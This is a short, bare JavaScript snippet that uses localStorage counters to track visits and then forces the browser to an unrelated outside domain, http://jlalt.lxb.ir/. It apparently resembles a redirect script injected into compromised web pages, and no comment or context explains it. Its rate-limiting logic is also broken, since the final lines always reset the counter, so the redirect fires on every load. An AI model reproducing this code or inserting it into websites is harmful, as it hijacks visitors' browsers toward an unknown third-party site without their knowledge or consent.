(function() {
	let seconds = new Date().getTime() / 1000;
	let lastRedirect = localStorage.getItem("lastredirect");
	if (lastRedirect != null) {
		lastRedirect = parseInt(lastRedirect);
		if ((seconds - lastRedirect) >= 18000) {
			localStorage.setItem("redirects", "1");
		}
	}
	let numberofRedirects = localStorage.getItem("redirects");
	if (numberofRedirects != null) {
		numberofRedirects = parseInt(numberofRedirects);
		if (numberofRedirects > 4)
			return;
		else {
			numberofRedirects++;
			localStorage.setItem("redirects", numberofRedirects);
		}
	}
	localStorage.setItem("lastredirect", seconds);
	localStorage.setItem("redirects", "1");
	window.location = "http://jlalt.lxb.ir/";
})();
